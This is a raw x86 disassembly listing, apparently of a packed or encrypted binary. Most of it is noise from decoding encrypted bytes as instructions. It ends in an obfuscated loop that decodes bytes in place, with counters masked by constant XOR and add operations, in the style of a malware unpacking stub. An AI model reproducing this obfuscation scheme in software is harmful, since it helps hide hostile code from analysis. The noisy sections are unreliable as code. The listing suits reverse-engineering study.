  418271:	std    
  418272:	fidivr DWORD PTR [esi-0x130f320b]
  418278:	mul    ecx
  41827a:	pop    es
  41827b:	idiv   ebx
  41827d:	mov    esp,0xe4f80f0a
  418282:	mov    dl,0xcf
  418284:	loope  0x418259
  418286:	(bad)  
  418287:	in     eax,0xed
  418289:	int3   
  41828a:	out    0xc8,eax
  41828c:	mov    ebx,0xdebdb5e6
  418291:	lock fcmovnu st,st(4)
  418294:	push   es
  418295:	inc    DWORD PTR [edx]
  418297:	rol    DWORD PTR [ecx+eax*8],1
  41829a:	test   ecx,0xcde3c7ca
  4182a0:	in     eax,0xfe
  4182a2:	in     al,0xbe
  4182a4:	out    dx,al
  4182a5:	in     al,dx
  4182a6:	call   0xb8187d61
  4182ab:	cmc    
  4182ac:	mov    dh,0xd8
  4182ae:	mov    ah,0xf5
  4182b0:	aam    0xe1
  4182b2:	mov    ecx,0xe6dcd4dd
  4182b7:	or     edi,edx
  4182b9:	retf   
  4182ba:	vpminub ymm1,ymm4,ymm1
  4182be:	hlt    
  4182bf:	push   es
  4182c0:	loop   0x4182d0
  4182c2:	leave  
  4182c3:	jmp    0x418289
  4182c5:	mov    cl,0xf0
  4182c7:	int3   
  4182c8:	cli    
  4182c9:	shr    edi,cl
  4182cb:	out    0xd2,al
  4182cd:	mov    eax,0xeadebdb4
  4182d2:	fsub   st,st(3)
  4182d4:	int3   
  4182d5:	(bad)  
  4182d7:	rcl    bh,0x7
  4182da:	ror    DWORD PTR [ecx],0xe8
  4182dd:	cli    
  4182de:	dec    BYTE PTR [esi]
  4182e0:	adc    bh,dh
  4182e2:	in     eax,dx
  4182e3:	mov    edi,0xe0e7b2e6
  4182e8:	jmp    0xf9ac:0xccf7e7e9
  4182ef:	iret   
  4182f0:	mov    ebp,0xbed1e3ce
  4182f5:	mov    edi,0xc00507f9
  4182fa:	(bad)  
  4182fb:	aad    0xf4
  4182fd:	call   0xef1f7ee0
  418302:	lods   al,BYTE PTR ds:[esi]
  418303:	scas   al,BYTE PTR es:[edi]
  418304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418305:	shr    dh,0xf0
  418308:	in     al,0xd4
  41830a:	mov    bh,0xf2
  41830c:	mov    ah,0xfe
  41830f:	in     al,0xd7
  418311:	call   0xe61c58e3
  418316:	rol    esp,0x7
  418319:	out    0xe3,eax
  41831b:	out    dx,eax
  41831c:	pop    es
  41831d:	sti    
  41831e:	(bad)  
  418320:	add    edi,edx
  418322:	(bad)  
  418323:	fsubr  QWORD PTR [eax-0x3a514c42]
  418329:	(bad)  
  41832b:	stc    
  41832c:	fstp   TBYTE PTR [esi-0x62c3047]
  418332:	aad    0xd0
  418334:	div    bl
  418336:	fcomip st,st(3)
  418338:	cld    
  418339:	shl    esi,0x9
  41833c:	in     eax,0xe8
  41833e:	in     eax,dx
  41833f:	fstp   st(1)
  418341:	repnz int3 
  418343:	out    dx,eax
  418344:	fadd   st(6),st
  418346:	(bad)
  418349:	in     eax,dx
  41834a:	mov    ch,0xd7
  41834c:	(bad)
  41834f:	call   0xd0fd8157
  418354:	out    dx,eax
  418355:	in     eax,dx
  418356:	idiv   esi
  418358:	rcl    ecx,0x1
  41835b:	jmp    edi
  41835d:	add    edi,ebx
  41835f:	enter  0xe80a,0xb3
  418363:	repz rol eax,cl
  418366:	int3   
  418367:	enter  0xd9e8,0xb4
  41836b:	sar    BYTE PTR [ebx-0x404b3333],cl
  418371:	out    dx,al
  418372:	(bad)  
  418374:	in     al,dx
  418375:	loopne 0x418348
  418377:	sti    
  418378:	repnz loopne 0x41837e
  41837b:	in     al,0x5
  41837d:	or     dl,ch
  41837f:	or     eax,0xd1a7e8e4
  418384:	into   
  418385:	cmc    
  418386:	in     eax,0xd5
  418388:	loopne 0x418353
  41838a:	out    0xcd,al
  41838c:	mul    ebp
  41838e:	aam    0xfe
  418390:	repz mov ebp,0xd0c2cdce
  418396:	ffreep st(5)
  418398:	(bad)  
  41839a:	shl    dl,1
  41839c:	hlt    
  41839d:	(bad)  
  41839f:	ret    0xdffc
  4183a2:	mov    ecx,0xddecdcaa
  4183a7:	(bad)  
  4183a9:	cmc    
  4183aa:	rol    bh,cl
  4183ac:	lock fdivrp st(0),st
  4183af:	(bad)  
  4183b1:	aam    0xbe
  4183b3:	jecxz  0x4183ad
  4183b5:	sar    esi,cl
  4183b7:	pop    es
  4183b8:	inc    cl
  4183ba:	add    BYTE PTR [ecx],cl
  4183bc:	cli    
  4183bd:	or     ebx,eax
  4183bf:	push   cs
  4183c0:	or     eax,0xcfbca7cd
  4183c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183c6:	loope  0x418396
  4183c8:	ret    0xd9ce
  4183cb:	in     eax,0xd8
  4183cd:	ror    esi,cl
  4183cf:	in     al,dx
  4183d0:	add    dh,BYTE PTR [esi+ecx*8+0xecbf01]
  4183d7:	mov    ebp,0xd7d5d9f3
  4183dc:	cld    
  4183dd:	push   es
  4183de:	out    dx,al
  4183df:	in     eax,0xe3
  4183e1:	push   es
  4183e2:	mov    eax,0xb1cec1ef
  4183e7:	int    0xf2
  4183e9:	retf   
  4183ea:	(bad)  
  4183eb:	mov    cl,0xb5
  4183ed:	fxch   st(0)
  4183ef:	mov    ecx,0xced7b402
  4183f4:	rol    BYTE PTR [ecx],0xd6
  4183f7:	rol    ecx,0xe0
  4183fa:	add    dh,bh
  4183fc:	or     esi,ebp
  4183fe:	in     eax,0x0
  418400:	or     cl,ah
  418402:	(bad)  
  418403:	out    dx,al
  418404:	mov    cl,0xd1
  418406:	scas   al,BYTE PTR es:[edi]
  418407:	aad    0xc0
  418409:	mov    cl,0xcc
  41840b:	xlat   BYTE PTR ds:[ebx]
  41840c:	(bad)  
  41840d:	(bad)  
  41840f:	(bad)  
  418410:	sar    ecx,1
  418412:	add    DWORD PTR [ebp-0x3e04210d],edi
  418418:	ret    0xe1bc
  41841b:	shl    edi,0xff
  41841e:	add    esp,ebx
  418420:	add    ecx,DWORD PTR [ecx]
  418422:	call   0xe51367eb
  418427:	shl    DWORD PTR [ecx-0xe0b2437],1
  41842d:	fucomi st,st(6)
  41842f:	stc    
  418430:	iret   
  418431:	test   DWORD PTR [ebx],0xd9f2d3ff
  418437:	mov    edx,0xc70109c4
  41843c:	loopne 0x41843f
  41843e:	hlt    
  41843f:	or     ecx,edi
  418441:	jmp    0x4183ec
  418443:	mov    al,0xd2
  418446:	loopne 0x41842a
  418448:	out    dx,eax
  418449:	in     al,0xcb
  41844b:	(bad)  
  41844c:	stc    
  41844d:	enter  0xb8b9,0xd4
  418451:	cmc    
  418452:	test   edi,0xe3f1f0e0
  418458:	(bad)  
  418459:	std    
  41845a:	add    ebp,eax
  41845c:	sti    
  41845d:	add    dh,ah
  41845f:	leave  
  418460:	in     al,0xea
  418462:	mov    cl,0xdd
  418464:	lods   al,BYTE PTR ds:[esi]
  418465:	jmp    0xd4d4:0xecbbf5bc
  41846c:	in     al,0xb8
  41846e:	(bad)  
  41846f:	in     al,dx
  418470:	shr    ebp,cl
  418472:	test   ch,0xfa
  418475:	push   es
  418476:	add    bl,al
  418478:	out    0xdf,eax
  41847a:	jmp    0x418482
  41847c:	leave  
  41847d:	out    0xed,al
  41847f:	(bad)  
  418480:	int    0xe1
  418482:	jmp    0x418450
  418484:	(bad)
  418487:	jecxz  0x418475
  418489:	sti    
  41848a:	hlt    
  41848b:	fnstenv [ecx-0x46063b03]
  418491:	int    0x0
  418493:	iret   
  418494:	shl    edx,1
  418496:	add    edi,ebx
  418498:	(bad)  
  418499:	cld    
  41849a:	(bad)
  41849d:	fisttp QWORD PTR [ecx]
  41849f:	fcmovu st,st(0)
  4184a1:	jmp    0x418450
  4184a3:	repz jecxz 0x41849b
  4184a6:	repz sar edx,1
  4184a9:	mov    ebx,0xffede0d3
  4184ae:	retf   0xd4cf
  4184b1:	mov    edx,0xd602d700
  4184b6:	std    
  4184b7:	loopne 0x418472
  4184b9:	vshufps ymm4,ymm7,ymm7,0xd
  4184be:	(bad)  
  4184bf:	loopne 0x41849f
  4184c1:	push   cs
  4184c2:	iret   
  4184c3:	ffree  st(4)
  4184c5:	loopne 0x41848e
  4184c7:	not    dl
  4184c9:	shl    al,0xb0
  4184cc:	repz retf 
  4184ce:	aad    0xb5
  4184d0:	aam    0xc9
  4184d2:	test   bh,0xdc
  4184d5:	add    ecx,edx
  4184d7:	loopne 0x4184b0
  4184d9:	out    0xe7,eax
  4184db:	loopne 0x4184b5
  4184dd:	cli    
  4184de:	into   
  4184df:	cld    
  4184e0:	in     eax,0x9
  4184e2:	shl    esp,0xee
  4184e5:	icebp  
  4184e6:	jmp    0xc93453ad
  4184eb:	mov    cl,0xcc
  4184ed:	mov    dh,0xc8
  4184ef:	rcr    ah,1
  4184f1:	lock fistp QWORD PTR [edx-0x45f9002d]
  4184f8:	(bad)  
  4184f9:	(bad)  
  4184fb:	clc    
  4184fc:	fimul  WORD PTR [esi]
  4184fe:	or     ch,bl
  418500:	std    
  418501:	loop   0x4184ea
  418503:	shl    BYTE PTR [eax-0x532c371f],0xc7
  41850a:	clc    
  41850b:	mov    cl,0xea
  41850d:	(bad)
  418510:	out    dx,al
  418511:	xlat   BYTE PTR ds:[ebx]
  418512:	rcl    al,1
  418514:	pop    es
  418515:	rol    ebp,cl
  418517:	mov    esp,0xe7ebe1e5
  41851c:	jmp    0xd301:0xf2f90f09
  418523:	enter  0xbdc7,0xef
  418527:	mov    ah,0xfb
  418529:	cmc    
  41852a:	in     eax,dx
  41852b:	mov    ecx,0xefcbdab8
  418530:	mov    ch,0xdc
  418532:	sti    
  418533:	test   esi,0xc7d6f6e0
  418539:	shl    ch,cl
  41853b:	sti    
  41853c:	jmp    0xf109144
  418541:	add    eax,0xdcddcec5
  418546:	not    eax
  418548:	mov    dh,0xeb
  41854a:	jmp    0x418521
  41854c:	leave  
  41854d:	retf   0xb6b8
  418550:	into   
  418551:	add    esi,esi
  418553:	enter  0xbef6,0xf2
  418557:	pop    es
  418558:	fdivrp st(0),st
  41855a:	loope  0x41853b
  41855c:	aad    0xdf
  41855e:	fxch   st(5)
  418560:	or     al,0xb
  418562:	stos   DWORD PTR es:[edi],eax
  418563:	ror    al,cl
  418565:	mov    cl,0xaf
  418567:	icebp  
  418568:	retf   0xbbc5
  41856b:	mov    ah,0xe4
  41856d:	mov    ebx,0xbccae9fa
  418572:	sar    ecx,1
  418574:	icebp  
  418575:	clc    
  418576:	int    0xfd
  418578:	retf   
  418579:	mov    esp,0xdd08fff0
  41857e:	ret    
  41857f:	push   es
  418580:	adc    ch,cl
  418582:	rcl    edi,cl
  418584:	out    dx,al
  418585:	out    dx,eax
  418586:	hlt    
  418587:	ror    eax,0xcd
  41858a:	mov    bh,0xf8
  41858c:	fldln2 
  41858e:	shl    edx,1
  418590:	jmp    0xc5e3:0xe6dcf801
  418597:	rol    bl,0xdf
  41859a:	or     edx,ebp
  41859c:	add    al,BYTE PTR [edi]
  41859e:	clc    
  41859f:	out    0xe8,eax
  4185a1:	into   
  4185a2:	in     eax,0xaf
  4185a4:	iret   
  4185a5:	int    0xc8
  4185a7:	scas   al,BYTE PTR es:[edi]
  4185a8:	xlat   BYTE PTR ds:[ebx]
  4185a9:	call   0xcc20387d
  4185ae:	in     al,dx
  4185af:	jmp    0x7d4:0x3e9e2d4
  4185b6:	mov    ebx,0xcbeaf2e0
  4185bb:	std    
  4185bc:	ror    DWORD PTR [ecx],0xf4
  4185bf:	out    0xee,eax
  4185c1:	fadd   st,st(3)
  4185c3:	stos   BYTE PTR es:[edi],al
  4185c4:	into   
  4185c5:	shr    BYTE PTR [edi-0x6441b56],0xf9
  4185cc:	(bad)  
  4185ce:	fcmovnb st,st(4)
  4185d0:	sar    DWORD PTR [ebp-0x1f28fd26],1
  4185d6:	ffreep st(7)
  4185d8:	(bad)  
  4185da:	hlt    
  4185db:	loop   0x4185c2
  4185dd:	(bad)  
  4185de:	fadd   st(2),st
  4185e0:	(bad)  
  4185e1:	fmul   st(2),st
  4185e3:	mov    esi,0xb1d1f5ac
  4185e8:	shr    edx,1
  4185ea:	stc    
  4185eb:	idiv   ebx
  4185ed:	hlt    
  4185ee:	cld    
  4185ef:	(bad)  
  4185f1:	cmc    
  4185f2:	call   edi
  4185f4:	(bad)  
  4185f5:	mov    esi,0x5e4debd
  4185fa:	(bad)  
  4185fc:	add    al,0xd6
  4185fe:	add    cl,dl
  418600:	(bad)  
  418601:	repz call 0xefef3dcf
  418607:	in     al,0xb2
  418609:	enter  0xeec1,0xf1
  41860d:	dec    ebx
  41860f:	call   0x40a580e
  418614:	push   es
  418615:	rcr    edi,cl
  418617:	rcl    edi,1
  418619:	aad    0xf8
  41861b:	jecxz  0x41861f
  41861d:	jmp    0xd3b9:0xe3fc0f0c
  418624:	shr    al,1
  418626:	(bad)  
  418627:	mov    cl,0xb3
  418629:	sar    eax,0xc0
  41862c:	(bad)  
  41862f:	(bad)  
  418630:	jmp    0xc7f4:0xf2d102e1
  418637:	ret    
  418638:	fild   WORD PTR [esi]
  41863a:	neg    ebx
  41863c:	loop   0x41860d
  41863e:	fiadd  DWORD PTR [edi]
  418640:	fldpi  
  418642:	mov    cl,0xc1
  418644:	in     al,0xc4
  418646:	fst    st(4)
  418648:	aad    0xe9
  41864a:	aam    0xb0
  41864c:	lock mov eax,0xddb9f2d9
  418652:	repnz cmc 
  418654:	(bad)  
  418655:	aad    0xd5
  418657:	shl    dl,1
  418659:	cld    
  41865a:	retf   0xfbe5
  41865d:	ror    al,0x6
  418660:	(bad)  
  418662:	int    0xd1
  418664:	test   ecx,0xd5e4e0e4
  41866a:	retf   0xb4e7
  41866d:	mov    edx,0xd1bcd9f7
  418672:	(bad)  
  418673:	into   
  418674:	mov    eax,0xfadcbfe5
  418679:	cmc    
  41867a:	clc    
  41867b:	lock psubusb mm0,QWORD PTR [eax]
  41867f:	repz in eax,dx
  418681:	ror    dh,0xc1
  418684:	out    0xc1,al
  418686:	in     al,0xef
  418688:	rcr    edx,cl
  41868a:	in     al,0xec
  41868c:	out    0xd8,eax
  41868e:	imul   ah
  418690:	stc    
  418691:	mov    eax,0xc0befffa
  418696:	mov    edx,0x2fcb8f5
  41869c:	or     edi,edx
  41869e:	loop   0x41868e
  4186a0:	in     al,0xe5
  4186a2:	int3   
  4186a3:	test   eax,0xe5f1f0c0
  4186a8:	jecxz  0x41865a
  4186aa:	repnz (bad) 
  4186ad:	in     al,dx
  4186ae:	out    dx,eax
  4186af:	jmp    0xec45428e
  4186b4:	frstpm(287 only) 
  4186b6:	add    eax,ebx
  4186b8:	cli    
  4186b9:	(bad)
  4186bd:	loopne 0x418688
  4186bf:	std    
  4186c0:	call   0xddff31a2
  4186c5:	fsub   st(1),st
  4186c7:	jmp    0x4186a9
  4186c9:	hlt    
  4186ca:	loopne 0x4186b7
  4186cc:	mov    ah,0xeb
  4186ce:	jmp    0xd3f7:0xd6e2d0
  4186d5:	rcr    ecx,cl
  4186d7:	in     al,0xc1
  4186d9:	in     eax,0xa
  4186db:	aad    0xda
  4186dd:	(bad)  
  4186de:	push   cs
  4186df:	in     al,0xe3
  4186e1:	or     esp,esp
  4186e3:	fsub   st(6),st
  4186e5:	mul    eax
  4186e7:	sti    
  4186e8:	lods   eax,DWORD PTR ds:[esi]
  4186e9:	mov    edx,0xcccbe0fb
  4186ee:	jmp    0x4186ef
  4186f0:	iret   
  4186f1:	fdivr  DWORD PTR [edi+0x4fcd5c1]
  4186f7:	in     al,0xd0
  4186f9:	(bad)
  4186fc:	or     ebp,ebx
  4186fe:	leave  
  4186ff:	(bad)  
  418700:	fsub   st(3),st
  418702:	shr    BYTE PTR [eax+ebp*4-0xc1c1744],1
  418709:	shl    DWORD PTR [esi+edx*8-0x31122226],0xd5
  418711:	fcomp  st(4)
  418713:	repnz add esp,ebx
  418716:	in     al,0xff
  418718:	ret    0xbc7
  41871b:	std    
  41871c:	push   es
  41871d:	mov    esp,0x4ebfcc9
  418722:	jecxz  0x4186cc
  418724:	in     eax,dx
  418725:	call   0xd00277fa
  41872a:	stc    
  41872b:	int    0xcc
  41872d:	ftst   
  41872f:	not    bl
  418731:	aad    0xd6
  418733:	(bad)  
  418734:	cmc    
  418735:	sti    
  418736:	mov    esi,0x2bcd3d6
  41873b:	std    
  41873c:	add    ebx,ebx
  41873e:	or     al,ch
  418740:	out    dx,eax
  418741:	fsub   st(7),st
  418743:	stos   BYTE PTR es:[edi],al
  418744:	ror    esp,1
  418746:	mov    bh,0xb3
  418748:	in     al,0xb1
  41874a:	mov    dl,0xb8
  41874c:	call   0xd7405d27
  418751:	out    dx,al
  418752:	mov    ebp,0x1dbdc
  418757:	add    eax,0xea04d8c5
  41875c:	(bad)
  41875f:	or     edi,esp
  418761:	or     esi,ebx
  418763:	fnstsw ax
  418765:	jmp    0xcc25365e
  41876a:	(bad)
  41876d:	rcl    ch,cl
  41876f:	jecxz  0x41875d
  418771:	int3   
  418772:	jmp    0xf5356977
  418777:	(bad)  
  418778:	(bad)  
  418779:	fdiv   st(6),st
  41877b:	loop   0x418764
  41877d:	leave  
  41877e:	jmp    0xbe026b68
  418783:	stos   BYTE PTR es:[edi],al
  418784:	shr    edx,cl
  418786:	retf   0xc9d5
  418789:	sti    
  41878a:	into   
  41878b:	jmp    0x418776
  41878d:	mov    eax,0xddffdfed
  418792:	clc    
  418793:	ret    0xd5f7
  418796:	fcmovu st,st(5)
  418798:	(bad)  
  418799:	hlt    
  41879a:	not    ch
  41879c:	clc    
  41879d:	jmp    0xe8de:0x203f8cf
  4187a4:	leave  
  4187a5:	in     al,dx
  4187a6:	jmp    0xeaf6638f
  4187ab:	fadd   st,st(7)
  4187ad:	retf   
  4187ae:	aad    0xc8
  4187b0:	rcl    esi,cl
  4187b2:	fld    QWORD PTR [ebx]
  4187b4:	out    0xdf,eax
  4187b6:	(bad)
  4187b9:	out    0xc2,al
  4187bb:	or     ebx,edi
  4187bd:	test   BYTE PTR [esi],0xcd
  4187c0:	enter  0xbeeb,0xaa
  4187c4:	test   eax,0xc3c6c7e1
  4187c9:	out    0xf0,al
  4187cb:	(bad)  
  4187cc:	in     eax,dx
  4187cd:	retf   
  4187ce:	hlt    
  4187cf:	f2xm1  
  4187d1:	rcr    dl,cl
  4187d3:	(bad)  
  4187d5:	mov    DWORD PTR [edi],0xc2fef2e0
  4187db:	or     esi,esi
  4187dd:	in     al,0x8
  4187df:	les    ecx,FWORD PTR [eax+ebx*8]
  4187e2:	fmul   st,st(3)
  4187e4:	out    0xd5,eax
  4187e6:	in     al,dx
  4187e7:	icebp  
  4187e8:	lods   eax,DWORD PTR ds:[esi]
  4187e9:	loop   0x4187d1
  4187eb:	in     eax,dx
  4187ec:	(bad)  
  4187ef:	aam    0xf0
  4187f1:	stc    
  4187f2:	cli    
  4187f3:	mov    edx,0xecbbb401
  4187f8:	icebp  
  4187f9:	jecxz  0x4187fe
  4187fb:	ror    ebx,0xe8
  4187fe:	lds    eax,FWORD PTR ds:0xaeaf04e3
  418804:	fmul   st(7),st
  418806:	jmp    0x4187bb
  418808:	ret    0xdbd3
  41880b:	shl    bl,0xdf
  41880e:	rcr    ebx,cl
  418810:	mov    esi,0xf0d1e9f5
  418815:	repnz rol BYTE PTR [ecx],1
  418818:	(bad)  
  418819:	mov    esp,0xcbddf905
  41881e:	leave  
  41881f:	jmp    0xd7ef:0xb1f10705
  418826:	fdivr  st(5),st
  418828:	sar    BYTE PTR [ebx-0x40340737],0xd5
  41882f:	in     eax,dx
  418830:	mul    ebx
  418832:	sar    DWORD PTR [ecx-0x391b473d],cl
  418838:	cld    
  418839:	fimul  WORD PTR [ecx]
  41883b:	call   0xc2517105
  418840:	cli    
  418841:	in     eax,0xb1
  418843:	repnz in al,dx
  418845:	mov    dh,0xd0
  418847:	enter  0xb2cc,0xc9
  41884b:	out    dx,eax
  41884c:	fucomip st,st(4)
  41884e:	jmp    0xdf3d5432
  418853:	cld    
  418854:	repz int3 
  418856:	add    bl,dl
  418858:	cmc    
  418859:	(bad)  
  41885a:	test   BYTE PTR ds:0xcdebde0e,0x4
  418861:	(bad)  
  418862:	mov    edi,0xc8e0b7cd
  418867:	in     al,dx
  418868:	mov    ch,0xcc
  41886b:	scas   al,BYTE PTR es:[edi]
  41886c:	mov    ah,0xe4
  41886e:	stc    
  41886f:	mov    edi,0xf8ecbcf5
  418874:	out    0xf5,al
  418876:	clc    
  418877:	jecxz  0x418835
  418879:	lock ret 
  41887b:	add    edi,ebp
  41887d:	(bad)  
  41887e:	hlt    
  41887f:	out    dx,al
  418880:	add    eax,0xdcc1c8dd
  418885:	mov    dl,0xcf
  418887:	icebp  
  418888:	call   0xcbfa385e
  41888d:	retf   0xbab8
  418890:	int    0xb4
  418892:	mov    ebp,0xfddbb9f5
  418897:	rcl    ebp,1
  418899:	fsincos 
  41889b:	aad    0xe7
  41889d:	or     dh,ch
  41889f:	add    edx,DWORD PTR [edx]
  4188a1:	retf   
  4188a2:	out    0xc7,eax
  4188a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188a5:	mov    bh,0xd5
  4188a7:	mov    ah,0xf0
  4188a9:	(bad)  
  4188aa:	in     al,dx
  4188ab:	retf   0xd8f5
  4188ae:	cli    
  4188af:	fucomp st(1)
  4188b1:	fnstsw ax
  4188b3:	mov    dh,0x2
  4188b5:	fcmovnb st,st(0)
  4188b7:	out    0x2,al
  4188b9:	or     DWORD PTR [ecx],ecx
  4188bb:	cld    
  4188bc:	retf   0x20b
  4188bf:	cli    
  4188c0:	fcomi  st,st(1)
  4188c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c3:	ror    bh,cl
  4188c5:	mov    bh,0xcc
  4188c7:	jmp    0xedd3:0xeed6f1d0
  4188ce:	std    
  4188cf:	shr    cl,1
  4188d1:	mov    ah,0xc3
  4188d3:	mov    edx,0xdbf2c2d0
  4188d8:	les    ecx,FWORD PTR [edx]
  4188da:	jecxz  0x4188dc
  4188dc:	dec    dh
  4188de:	int    0x2
  4188e0:	dec    esi
  4188e2:	icebp  
  4188e3:	in     eax,0xbe
  4188e5:	jmp    0xccf9:0xedf7d3b0
  4188ec:	in     eax,dx
  4188ed:	mov    edi,0xfaeefdcc
  4188f2:	stc    
  4188f3:	mov    dh,0xc1
  4188f5:	repnz clc 
  4188f7:	rcr    bh,1
  4188f9:	std    
  4188fa:	push   es
  4188fb:	or     edi,ecx
  4188fd:	(bad)  
  4188fe:	fcomp  st(0)
  418900:	sti    
  418901:	push   es
  418902:	enter  0xace3,0xd5
  418906:	mov    esp,0xeaeee1c8
  41890c:	out    dx,eax
  41890d:	(bad)  
  41890e:	cli    
  41890f:	lock mov edi,0xecf4faba
  418915:	(bad)  
  418916:	(bad)  
  418917:	shl    esp,cl
  418919:	shl    bl,0xe1
  41891c:	add    eax,DWORD PTR [ecx]
  41891e:	in     eax,0xda
  418920:	pop    es
  418921:	in     al,0xb9
  418923:	shl    DWORD PTR [eax-0x4d3a3234],0xee
  41892a:	in     eax,0xf2
  41892c:	int3   
  41892d:	repz cld 
  41892f:	mov    esp,0xd8dfbdf0
  418934:	sar    ch,cl
  418936:	hlt    
  418937:	add    eax,0xd5ffc7f1
  41893c:	add    ch,cl
  41893e:	fadd   QWORD PTR [esi]
  418940:	or     edx,edx
  418942:	loopne 0x418924
  418944:	call   0xd3116e09
  418949:	idiv   edx
  41894b:	out    dx,eax
  41894c:	call   0xdd207f2e
  418951:	mov    ah,0xda
  418953:	stc    
  418954:	push   es
  418955:	jecxz  0x418954
  418957:	rcr    cl,cl
  418959:	in     eax,0xd5
  41895b:	aad    0xfc
  41895d:	sti    
  41895e:	or     eax,0xdceaebf3
  418963:	mov    esp,0xb3f1deeb
  418968:	ret    0xd4bb
  41896b:	mov    eax,0xd1d7dfed
  418970:	fcomi  st,st(0)
  418972:	loope  0x41892d
  418974:	rol    BYTE PTR [edi],cl
  418976:	fdiv   st,st(2)
  418978:	hlt    
  418979:	(bad)  
  41897b:	in     eax,0x4
  41897d:	(bad)  
  41897e:	cld    
  41897f:	jmp    0xd2319661
  418984:	jmp    0x418939
  418986:	retf   0xd6f3
  418989:	stc    
  41898a:	out    0xd7,eax
  41898c:	out    dx,eax
  41898d:	std    
  41898e:	mov    edi,0xbbd6feff
  418993:	shl    ecx,0xb8
  418996:	loop   0x41897b
  418998:	(bad)  
  418999:	fucom  st(7)
  41899b:	retf   0xc5ca
  41899e:	cld    
  41899f:	int    0xef
  4189a1:	in     eax,0xaa
  4189a3:	ror    edx,0xae
  4189a6:	hlt    
  4189a7:	(bad)
  4189aa:	repz clc 
  4189ac:	fld    st(6)
  4189ae:	fcomi  st,st(6)
  4189b0:	rcr    bl,1
  4189b2:	(bad)  
  4189b3:	faddp  st(1),st
  4189b5:	aam    0xc6
  4189b7:	lds    eax,FWORD PTR [eax]
  4189b9:	sar    ch,cl
  4189bb:	add    esp,eax
  4189bd:	(bad)  
  4189be:	cmc    
  4189bf:	std    
  4189c0:	add    ecx,edi
  4189c2:	mov    edi,0x3bc12bbc
  4189c7:	ror    BYTE PTR [edi],1
  4189c9:	test   DWORD PTR [ebx+0x1],ecx
  4189cc:	add    BYTE PTR [eax],al
  4189ce:	mov    eax,DWORD PTR [ebp-0x8]
  4189d1:	add    eax,DWORD PTR [ebp-0xd0]
  4189d7:	mov    al,BYTE PTR [eax]
  4189d9:	mov    BYTE PTR [ebp-0xf5],al
  4189df:	mov    eax,DWORD PTR [ebp-0xdc]
  4189e5:	xor    eax,0x75108b5
  4189ea:	add    eax,0x3272fb
  4189ef:	mov    DWORD PTR [ebp-0xfc],eax
  4189f5:	jmp    0x418a07
  4189fa:	mov    eax,DWORD PTR [ebp-0xfc]
  418a00:	inc    eax
  418a01:	mov    DWORD PTR [ebp-0xfc],eax
  418a07:	mov    eax,DWORD PTR [ebp-0xd8]
  418a0d:	xor    eax,0x75108b5
  418a12:	add    eax,0x3272fb
  418a17:	cmp    DWORD PTR [ebp-0xfc],eax
  418a1d:	jae    0x418aa4
  418a23:	mov    eax,DWORD PTR [ebp-0xfc]
  418a29:	sub    eax,0x3272fb
  418a2e:	xor    eax,0x75108b5
  418a33:	add    eax,0x7f55d8f2
  418a38:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a3e:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a45:	mov    eax,DWORD PTR [ebp-0xfc]
  418a4b:	cmp    DWORD PTR [ebp+eax*4-0xf4],0x244ecb9d
  418a56:	jbe    0x418a80
  418a5c:	mov    eax,DWORD PTR [ebp-0xfc]
  418a62:	mov    eax,DWORD PTR [ebp+eax*4-0xf4]
  418a69:	add    eax,0x405fcdc
  418a6e:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a74:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a7b:	jmp    0x418a9f
  418a80:	mov    eax,DWORD PTR [ebp-0xfc]
  418a86:	mov    eax,DWORD PTR [ebp+eax*4-0xf4]
  418a8d:	sub    eax,0x250bcdc
  418a92:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a98:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a9f:	jmp    0x4189fa
  418aa4:	xor    eax,eax
  418aa6:	inc    eax
  418aa7:	jne    0x418ac7
  418aad:	movzx  eax,BYTE PTR [ebp-0xf5]
  418ab4:	xor    eax,0x83
  418ab9:	add    eax,0x8
  418abc:	mov    BYTE PTR [ebp-0xf5],al
  418ac2:	jmp    0x418b06
  418ac7:	mov    eax,DWORD PTR [ebp-0xd4]
  418acd:	xor    eax,0x75108b5
  418ad2:	add    eax,0x3272fb
  418ad7:	movzx  ecx,BYTE PTR [ebp-0xf5]
  418ade:	sub    ecx,eax
  418ae0:	mov    BYTE PTR [ebp-0xf5],cl
  418ae6:	mov    ecx,DWORD PTR [ebp-0xcc]
  418aec:	xor    ecx,0x75108b5
  418af2:	add    ecx,0x3272fb
  418af8:	mov    al,BYTE PTR [ebp-0xf5]
  418afe:	ror    al,cl
  418b00:	mov    BYTE PTR [ebp-0xf5],al
  418b06:	xor    eax,eax
  418b08:	mov    eax,DWORD PTR [ebp-0x8]
  418b0b:	add    eax,DWORD PTR [ebp-0xd0]
  418b11:	mov    cl,BYTE PTR [ebp-0xf5]
  418b17:	mov    BYTE PTR [eax],cl
  418b19:	mov    eax,DWORD PTR [ebp-0xd0]
  418b1f:	sub    eax,0x3272fb
  418b24:	xor    eax,0x75108b5
  418b29:	cmp    eax,DWORD PTR [ebp-0xdc]
  418b2f:	jne    0x418b8c
  418b35:	mov    eax,DWORD PTR [ebp-0xc8]
  418b3b:	xor    eax,0x75108b5
  418b40:	add    eax,0x3272fb
  418b45:	mov    ecx,DWORD PTR [ebp-0xe0]
  418b4b:	xor    ecx,0x75108b5
  418b51:	add    ecx,0x3272fb
  418b57:	sub    eax,ecx
  418b59:	sub    eax,0x3272fb
  418b5e:	xor    eax,0x75108b5
  418b63:	mov    DWORD PTR [ebp-0xc8],eax
  418b69:	mov    eax,DWORD PTR [ebp-0xe0]
  418b6f:	xor    eax,0x75108b5
  418b74:	add    eax,0x3272fb
  418b79:	mov    ecx,DWORD PTR [ebp-0x100]
  418b7f:	sub    ecx,eax
  418b81:	mov    DWORD PTR [ebp-0xd0],ecx
  418b87:	jmp    0x418baa
  418b8c:	mov    eax,DWORD PTR [ebp-0xe0]
  418b92:	xor    eax,0x75108b5
  418b97:	add    eax,0x3272fb
  418b9c:	mov    ecx,DWORD PTR [ebp-0xd0]
  418ba2:	sub    ecx,eax
  418ba4:	mov    DWORD PTR [ebp-0xd0],ecx
  418baa:	jmp    0x416531
